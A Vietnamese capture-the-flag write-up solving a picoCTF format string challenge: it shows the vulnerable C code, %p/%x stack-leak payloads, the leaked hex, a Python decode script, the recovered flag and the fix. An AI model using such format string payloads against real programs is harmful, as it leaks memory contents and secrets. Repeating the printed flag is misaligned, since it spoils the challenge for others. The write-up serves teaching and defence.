# Writeup: Format String Leak Flag From Stack

## Thông tin bài

Chương trình cho source C như sau:

```c
#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f);
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

Mục tiêu là lấy được flag.

Flag tìm được:

```text
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```

---

## Phân tích chương trình

Trong hàm `vuln()` có hai biến local:

```c
char flag[BUFSIZE];
char story[128];
```

Trong đó:

```c
#define BUFSIZE 64
#define FLAGSIZE 64
```

nên `flag` có kích thước 64 byte, `story` có kích thước 128 byte.

Sau đó chương trình gọi:

```c
readflag(flag, FLAGSIZE);
```

Hàm `readflag()` sẽ mở file `flag.txt`, rồi đọc nội dung flag vào mảng `flag`:

```c
fgets(buf, len, f);
```

Tức là sau dòng này, flag nằm trong biến local `flag`, mà biến local nằm trên stack.

Tiếp theo chương trình nhận input của người dùng:

```c
scanf("%127s", story);
```

Dòng này giới hạn input tối đa 127 ký tự, nên ở đây không khai thác theo hướng buffer overflow.

Lỗi chính nằm ở dòng:

```c
printf(story);
```

Đáng lẽ chương trình phải viết:

```c
printf("%s", story);
```

Do dùng trực tiếp input của người dùng làm format string, ta có thể nhập các format specifier như `%p`, `%x`, `%s` để làm `printf()` in ra dữ liệu trên stack.

Đây là lỗi format string.

---

## Ý tưởng khai thác

Vì flag đã được đọc vào biến local `flag` trên stack, ta có thể dùng lỗi format string để leak các giá trị trên stack.

Payload test:

```bash
python3 -c 'print("%p."*40)' | ./vuln
```

Hoặc dùng `%x` để leak từng cụm 4 byte:

```bash
python3 -c 'print("%x."*40)' | ./vuln
```

Khi chạy local với flag test là `OK`, output có đoạn:

```text
0xa4b4f
```

Chuỗi `OK\n` trong ASCII là:

```text
O  = 0x4f
K  = 0x4b
\n = 0x0a
```

Trong bộ nhớ little endian, nó được biểu diễn thành:

```text
4f 4b 0a
```

Khi in ra dưới dạng số, ta thấy:

```text
0x000a4b4f
```

hay rút gọn là:

```text
0xa4b4f
```

Điều này xác nhận rằng ta đã leak được nội dung của biến `flag` trên stack.

---

## Leak flag thật

Sau khi xác định được vùng chứa flag, leak các giá trị stack liên tiếp bằng `%x`.

Payload:

```bash
python3 -c 'print("%36$x.%37$x.%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x")' | ./vuln
```

Output thu được:

```text
6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.315f6b63.62326131.7d613235
```

Mỗi cụm là 4 byte dữ liệu bị in ra dưới dạng hex.

Do kiến trúc x86 dùng little endian, mỗi cụm 4 byte cần được đảo byte lại.

---

## Decode flag

Các cụm leak được:

```text
6f636970
7b465443
6b34334c
5f676e31
67346c46
6666305f
3474535f
315f6b63
62326131
7d613235
```

Decode từng cụm:

```text
6f636970 -> 70 69 63 6f -> pico
7b465443 -> 43 54 46 7b -> CTF{
6b34334c -> 4c 33 34 6b -> L34k
5f676e31 -> 31 6e 67 5f -> 1ng_
67346c46 -> 46 6c 34 67 -> Fl4g
6666305f -> 5f 30 66 66 -> _0ff
3474535f -> 5f 53 74 34 -> _St4
315f6b63 -> 63 6b 5f 31 -> ck_1
62326131 -> 31 61 32 62 -> 1a2b
7d613235 -> 35 32 61 7d -> 52a}
```

Ghép lại:

```text
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```

---

## Script decode nhanh

Có thể dùng Python để decode tự động:

```python
leaks = "6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.315f6b63.62326131.7d613235"

flag = b""

for x in leaks.split("."):
    flag += int(x, 16).to_bytes(4, "little")

print(flag.decode())
```

Kết quả:

```text
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```

---

## Nguyên nhân lỗi

Lỗi nằm ở dòng:

```c
printf(story);
```

Vì `story` là dữ liệu do người dùng nhập vào, nếu người dùng nhập `%x`, `%p`, `%s`, `printf()` sẽ hiểu đó là format specifier và cố đọc dữ liệu từ stack.

Cách sửa đúng:

```c
printf("%s", story);
```

Khi đó input chỉ được in ra như chuỗi bình thường, không được hiểu là format string.

---

## Kết luận

Bài này không khai thác buffer overflow, vì input đã bị giới hạn bởi:

```c
scanf("%127s", story);
```

Lỗ hổng chính là format string ở:

```c
printf(story);
```

Do flag được đọc vào biến local trên stack trước khi gọi `printf(story)`, ta có thể nhập nhiều `%x` để leak dữ liệu trên stack. Sau đó đảo byte từng cụm theo little endian để khôi phục flag.

Flag cuối cùng:

```text
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```